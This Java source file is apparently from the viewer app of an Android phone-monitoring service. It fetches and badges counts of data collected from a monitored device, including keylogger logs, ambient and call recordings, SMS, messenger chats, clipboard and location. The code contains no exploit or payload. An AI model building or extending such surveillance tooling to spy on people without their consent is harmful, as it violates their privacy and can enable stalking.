package com.scp.viewer.API;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.util.Log;
import android.view.View;
import android.widget.TextView;

import androidx.recyclerview.widget.RecyclerView;

import com.scp.viewer.Adapter.AdapterFeatureDashboard;
import com.scp.viewer.Model.Feature;
import com.scp.viewer.Model.Table;
import com.scp.viewer.View.DashBoard;
import com.scp.viewer.View.MyApplication;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;

import static android.content.Context.MODE_PRIVATE;
import static com.scp.viewer.API.APIMethod.getToTalLog;
import static com.scp.viewer.API.APIMethod.setSharedPreferLong;
import static com.scp.viewer.API.APIMethod.setToTalLog;
import static com.scp.viewer.API.APIMethod.setToTalLong;
import static com.scp.viewer.API.APIMethod.setTotalLongForSMS;
import static com.scp.viewer.API.APIURL.bodyLogin;
import static com.scp.viewer.API.APIURL.deviceObject;
import static com.scp.viewer.API.APIURL.getDateNowInMaxDate;
import static com.scp.viewer.API.Global.AMBIENT_RECORDING_TOTAL;
import static com.scp.viewer.API.Global.APP_INSTALLATION_TOTAL;
import static com.scp.viewer.API.Global.APP_NAME;
import static com.scp.viewer.API.Global.APP_USAGE_TOTAL;
import static com.scp.viewer.API.Global.CALENDAR_TOTAL;
import static com.scp.viewer.API.Global.CALL_TOTAL;
import static com.scp.viewer.API.Global.CLIPBOARD_TOTAL;
import static com.scp.viewer.API.Global.CONTACT_TOTAL;
import static com.scp.viewer.API.Global.FACEBOOK_TOTAL;
import static com.scp.viewer.API.Global.GET_ALL_ROW_TOTALS;
import static com.scp.viewer.API.Global.GET_AMBIENT_VOICE_RECORDING;
import static com.scp.viewer.API.Global.GET_APPLICATION_USAGE;
import static com.scp.viewer.API.Global.GET_APP_INSTALLATION_HISTORY;
import static com.scp.viewer.API.Global.GET_CALENDAR_HISTORY;
import static com.scp.viewer.API.Global.GET_CALL_HISTORY;
import static com.scp.viewer.API.Global.GET_CLIPBOARD_HISTORY;
import static com.scp.viewer.API.Global.GET_CONTACT_HISTORY;
import static com.scp.viewer.API.Global.GET_KEYLOGGER_HISTORY;
import static com.scp.viewer.API.Global.GET_LOCATION_HISTORY;
import static com.scp.viewer.API.Global.GET_NETWORK_HISTORY;
import static com.scp.viewer.API.Global.GET_NOTES_HISTORY;
import static com.scp.viewer.API.Global.GET_NOTIFICATION_HISTORY;
import static com.scp.viewer.API.Global.GET_PHONE_CALL_RECORDING;
import static com.scp.viewer.API.Global.GET_PHOTO_HISTORY;
import static com.scp.viewer.API.Global.GET_SMS_HISTORY;
import static com.scp.viewer.API.Global.GET_URL_HISTORY;
import static com.scp.viewer.API.Global.GET_YOUTUBE_HISTORY;
import static com.scp.viewer.API.Global.GPS_TOTAL;
import static com.scp.viewer.API.Global.HANGOUTS_TOTAL;
import static com.scp.viewer.API.Global.INSTAGRAM_TOTAL;
import static com.scp.viewer.API.Global.KEYLOGGER_TOTAL;
import static com.scp.viewer.API.Global.LENGHT;
import static com.scp.viewer.API.Global.MIN_TIME;
import static com.scp.viewer.API.Global.NETWORK_TOTAL;
import static com.scp.viewer.API.Global.NEW_ROW;
import static com.scp.viewer.API.Global.NOTE_TOTAL;
import static com.scp.viewer.API.Global.NOTIFICATION_TOTAL;
import static com.scp.viewer.API.Global.PHONE_CALL_RECORDING_TOTAL;
import static com.scp.viewer.API.Global.PHOTO_TOTAL;
import static com.scp.viewer.API.Global.SETTINGS;
import static com.scp.viewer.API.Global.SKYPE_TOTAL;
import static com.scp.viewer.API.Global.SMS_DEFAULT_TYPE;
import static com.scp.viewer.API.Global.SMS_FACEBOOK_TYPE;
import static com.scp.viewer.API.Global.SMS_HANGOUTS_TYPE;
import static com.scp.viewer.API.Global.SMS_INSTAGRAM_TYPE;
import static com.scp.viewer.API.Global.SMS_SKYPE_TYPE;
import static com.scp.viewer.API.Global.SMS_TOTAL;
import static com.scp.viewer.API.Global.SMS_VIBER_TYPE;
import static com.scp.viewer.API.Global.SMS_WHATSAPP_TYPE;
import static com.scp.viewer.API.Global.TABLE;
import static com.scp.viewer.API.Global.TOTAL_ROW;
import static com.scp.viewer.API.Global.URL_TOTAL;
import static com.scp.viewer.API.Global.VIBER_TOTAL;
import static com.scp.viewer.API.Global.WHATSAPP_TOTAL;
import static com.scp.viewer.API.Global.YOUTUBE_TOTAL;
import static com.scp.viewer.API.Global._TOTAL;
import static com.scp.viewer.View.SMSHistory.style;

/**
 * Author: Lucaswalker@jexpa.com
 * Class: APIGetTotalItemOfFeature This is a class that specializes in handling the total item
 * of each feature currently on the server. (SMS, Call, Photos, Locations...)
 * History: 8/14/2020
 */
public class APIGetTotalItemOfFeature {

    @SuppressLint("StaticFieldLeak")
    public static class contactAsyncTask extends AsyncTask<String, Void, String> {

        String functionName;
        String deviceID;
        Context context;
        String smsType;
        TextView txt_total_number;

        public contactAsyncTask(String function, String deviceID, Context context, TextView txt_total_number) {
            this.functionName = function;
            this.deviceID = deviceID;
            this.context = context;
            this.txt_total_number = txt_total_number;
        }

        @Override
        protected String doInBackground(String... strings)
        {
            String value;
            value = "<RequestParams Device_ID=\"" + deviceID + "\" Start=\"0\" Length=\""+ LENGHT +"\" Min_Date=\"" + MIN_TIME + "\" Max_Date=\"" +  getDateNowInMaxDate() + "\"  />";
            String function = functionName;
            return APIURL.POST(value, function);
        }

        @SuppressLint("SetTextI18n")
        @Override
        protected void onPostExecute(String s) {
            try {
                String totalRow = "0";
                deviceObject(s);
                if(bodyLogin.getData() == null)
                {
                    return;
                }
                Log.d("GetPhoneRecording", ""+ "functionName = "+ functionName + "  bodyLogin.getData() = "+ bodyLogin.getData());
                JSONObject jsonObj = new JSONObject(bodyLogin.getData());

                Log.d("GetPhoneRecording", ""+ "functionName = "+ functionName + "  jsonObj = "+ jsonObj);
                if(functionName.equals("GetPhoneRecording") )
                {
                    JSONObject jsonObjData = jsonObj.getJSONObject("Data");
                    Log.d("GetPhoneRecording", "jsonObjData = "+ jsonObjData);
                    JSONArray GPSJson = jsonObjData.getJSONArray("Table1");
                    Log.d("GetPhoneRecording", "GPSJson = "+ GPSJson);
                    if(GPSJson.length()>0)
                        totalRow = GPSJson.getJSONObject(0).getString("TotalRow");

                }else if(functionName.equals(GET_AMBIENT_VOICE_RECORDING))
                {
                    if(bodyLogin.getData().contains("Table1"))
                    {
                        JSONArray AmbientTable1 = jsonObj.getJSONArray("Table1");
                        if(AmbientTable1.length()>0)
                            totalRow = AmbientTable1.getJSONObject(0).getString("TotalRow");
                    }

                }
                else if(functionName.equals("GetURL"))
                {
                    JSONArray URLTable1 = jsonObj.getJSONArray("Table1");
                    if(URLTable1.length()>0)
                        totalRow = URLTable1.getJSONObject(0).getString("TotalRow");
                }
                else if(functionName.equals("GetLocations"))
                {

                    JSONArray GPSJsonPaging = jsonObj.getJSONArray("Table1");
                    totalRow = getToTalLog(null,GPSJsonPaging,"TotalRow");
                }
                else if(functionName.equals("GetPhotos"))
                {
                    JSONObject jsonObjListImg = jsonObj.getJSONObject("ListImg");
                    JSONArray PhotosonTable1 = jsonObjListImg.getJSONArray("Table1");
                    if(PhotosonTable1.length()>0)
                        totalRow = PhotosonTable1.getJSONObject(0).getString("TotalRow");
                }
                else if(functionName.equals(GET_SMS_HISTORY))
                {

                    JSONArray GPSJsonTable1 = jsonObj.getJSONArray("Table1");
                    if(GPSJsonTable1.length()>0)
                        totalRow = GPSJsonTable1.getJSONObject(0).getString("TotalRow");
                }
                else
                {
                    JSONArray GPSJsonTable1 = jsonObj.getJSONArray("Table1");
                    if(GPSJsonTable1.toString().isEmpty())
                    {
                        totalRow = jsonObj.getString("TotalRows");
                    }
                    else {
                        totalRow = GPSJsonTable1.getJSONObject(0).getString("TotalRow");
                    }
                }

                if(!totalRow.equals("0"))
                {
                    txt_total_number.setVisibility(View.VISIBLE);
                    txt_total_number.setText(totalRow);
                }

                setNewTotalItemOfFeature(functionName, totalRow, txt_total_number);

            } catch (JSONException e) {
                MyApplication.getInstance().trackException(e);
                e.printStackTrace();
            }
        }

        /**
         * setNewTotalItemOfFeature this is the method that checks the value of totalRow
         * has greater than the current saved value of each feature.
         */
        @SuppressLint("SetTextI18n")
        private void setNewTotalItemOfFeature(String functionName, String totalRow, TextView txt_total_number)
        {

            if(functionName.equals(GET_AMBIENT_VOICE_RECORDING))
            {
                setTotalNumberTextView(AMBIENT_RECORDING_TOTAL + deviceID, totalRow);
            }
            else if(functionName.equals(GET_PHONE_CALL_RECORDING))
            {
                setTotalNumberTextView(PHONE_CALL_RECORDING_TOTAL + deviceID, totalRow);
            }
        }


        /**
         * setTotalNumberTextView This is a method to assign a new value to textview to notify you of new data.
         */
        @SuppressLint("SetTextI18n")
        private void setTotalNumberTextView(String FunctionName, String totalRow)
        {
            SharedPreferences preferences = context.getSharedPreferences(SETTINGS, MODE_PRIVATE);
            long totalOld = preferences.getLong(FunctionName, -1);

            if(totalOld == -1)
                totalOld = 0;

            if(Long.parseLong(totalRow) > totalOld)
            {
                txt_total_number.setVisibility(View.VISIBLE);
                txt_total_number.setText((Long.parseLong(totalRow) - totalOld)+"");
            }
            else {
                txt_total_number.setVisibility(View.GONE);
            }

        }
    }


    @SuppressLint("StaticFieldLeak")
    public static class AllRowTotalAsyncTask extends AsyncTask<String, Void, String> {


        String deviceID;
        Activity context;
        AdapterFeatureDashboard adapterFeatureDashboard;
        RecyclerView rcl_Feature;
        ArrayList<Feature> featureList;
        Table table;


        public AllRowTotalAsyncTask( String deviceID, Activity context, AdapterFeatureDashboard adapterFeatureDashboard,RecyclerView rcl_Feature, ArrayList<Feature> featureList, Table table) {

            this.deviceID = deviceID;
            this.context = context;
            this.adapterFeatureDashboard = adapterFeatureDashboard;
            this.rcl_Feature = rcl_Feature;
            this.featureList = featureList;
            this.table = table;
        }


        @Override
        protected String doInBackground(String... strings)
        {
            String value;
            value = "<RequestParams Device_ID=\"" + deviceID + "\" Start=\"0\" Length=\""+ LENGHT +"\" Min_Date=\"" + MIN_TIME + "\" Max_Date=\"" +  getDateNowInMaxDate() + "\"  />";

            return APIURL.POST(value, GET_ALL_ROW_TOTALS);
        }

        @SuppressLint("SetTextI18n")
        @Override
        protected void onPostExecute(String s) {
            try {
                String totalRow = "0";
                deviceObject(s);
                if(bodyLogin.getData() == null)
                {
                    return;
                }
                Log.d("GetPhoneRecording", ""+ "functionName = "+ GET_ALL_ROW_TOTALS + "  bodyLogin.getData() = "+ bodyLogin.getData());
                JSONObject jsonObj = new JSONObject(bodyLogin.getData());

                //JSONObject jsonObjData = jsonObj.getJSONObject(DATA_JSON);
                JSONArray tableJson = jsonObj.getJSONArray(TABLE);

                for (int i=0; i<tableJson.length(); i++)
                {
                    JSONObject jsonObjRow = (JSONObject) tableJson.get(i);
                    String functionName = jsonObjRow.getString(APP_NAME);
                    int totalRowOfFeature = jsonObjRow.getInt(TOTAL_ROW);

                    setTotalRowOfFeature(functionName, totalRowOfFeature, deviceID, context);
                }

                adapterFeatureDashboard = new AdapterFeatureDashboard(featureList, context, table);
                rcl_Feature.setAdapter(adapterFeatureDashboard);
                adapterFeatureDashboard.notifyDataSetChanged();

                // update adapter

            } catch (JSONException e) {
                MyApplication.getInstance().trackException(e);
                e.printStackTrace();
            }
        }

    }

    /**
     * setNewTotalRowOfFeature this is the method that checks the value of totalRow
     * has greater than the current saved value of each feature.
     */
    @SuppressLint("SetTextI18n")
    private static void setTotalRowOfFeature(String functionName, int totalRow, String deviceID, Context context)
    {

        setNewRowNumberOfFeature(functionName+_TOTAL + deviceID, totalRow, context);
      /*  if(functionName.equals("call"))
        {
            setNewRowNumberOfFeature(functionName+_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("contact"))
        {

            setNewRowNumberOfFeature(CONTACT_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("Url"))
        {

            setNewRowNumberOfFeature(URL_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("gps"))
        {

            setNewRowNumberOfFeature(GPS_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("photo"))
        {

            setNewRowNumberOfFeature(PHOTO_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("phone call recording"))
        {

            setNewRowNumberOfFeature(PHONE_CALL_RECORDING_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals(GET_AMBIENT_VOICE_RECORDING))
        {

            setNewRowNumberOfFeature(AMBIENT_RECORDING_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("app_usage"))
        {

            setNewRowNumberOfFeature(APP_USAGE_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("app_installation")) // 2021-07-12
        {

            setNewRowNumberOfFeature(APP_INSTALLATION_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("clipboard")) // 2021-07-14
        {

            setNewRowNumberOfFeature(CLIPBOARD_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("note"))
        {
            setNewRowNumberOfFeature(NOTE_TOTAL + deviceID, totalRow, context);

        }
        else if(functionName.equals("calendar")) // 2021-07-15
        {

            setNewRowNumberOfFeature(CALENDAR_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("network connection")) // 2021-07-15
        {

            setNewRowNumberOfFeature(NETWORK_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("youtube")) // 2021-07-15
        {

            setNewRowNumberOfFeature(YOUTUBE_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("notification")) // 2021-07-19
        {

            setNewRowNumberOfFeature(NOTIFICATION_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("keylogger")) // 2021-07-19
        {

            setNewRowNumberOfFeature(KEYLOGGER_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("sms"))
        {
            setNewRowNumberOfFeature(SMS_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("whatsapp"))
        {
            setNewRowNumberOfFeature(WHATSAPP_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("viber"))
        {
            setNewRowNumberOfFeature(VIBER_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("facebook"))
        {
            setNewRowNumberOfFeature(FACEBOOK_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("skype"))
        {
            setNewRowNumberOfFeature(SKYPE_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("hangouts"))
        {
            setNewRowNumberOfFeature(HANGOUTS_TOTAL + deviceID, totalRow, context);
        }
        else if(functionName.equals("instagram"))
        {
            setNewRowNumberOfFeature(INSTAGRAM_TOTAL + deviceID, totalRow, context);
        }*/
    }


    public static void setNewRowNumber(String functionName, String deviceID,Context context,  TextView txt_total_number)
    {
        SharedPreferences preferences = context.getSharedPreferences(SETTINGS, MODE_PRIVATE);
        long totalNew = preferences.getLong(functionName+_TOTAL+ deviceID + NEW_ROW, -1);

        if(totalNew == -1)
            totalNew = 0;
        Log.d("TotalRoS", "setNewRowNumber totalNew = "+ totalNew);
        if(totalNew != 0)
        {
            txt_total_number.setVisibility(View.VISIBLE);
            txt_total_number.setText(String.valueOf(totalNew));
        }
        else {
            txt_total_number.setVisibility(View.GONE);
        }
    }

    /**
     * setNewRowNumberOfFeature This is a method to help save the new data of each feature separately to notify users of new data to view.
     * @param functionName function name
     * @param totalRow total row
     */
    private static void setNewRowNumberOfFeature(String functionName, long totalRow, Context context)
    {
        SharedPreferences preferences = context.getSharedPreferences(SETTINGS, MODE_PRIVATE);
        long totalOld = preferences.getLong(functionName, -1);

        if(totalOld == -1)
            totalOld = 0;

        if(totalRow > totalOld)
        {
            //setSharedPreferLong(context,functionName,totalRow);
            Log.d("TotalRoS"," CALL_TOTAL = "+  functionName);
            setSharedPreferLong(context,functionName + NEW_ROW,(totalRow - totalOld));
        }
        else {
            //setSharedPreferLong(context,functionName,totalRow);
            Log.d("TotalRoS"," CALL_TOTAL = "+  functionName);
            setSharedPreferLong(context,functionName + NEW_ROW,0);
        }
    }

}
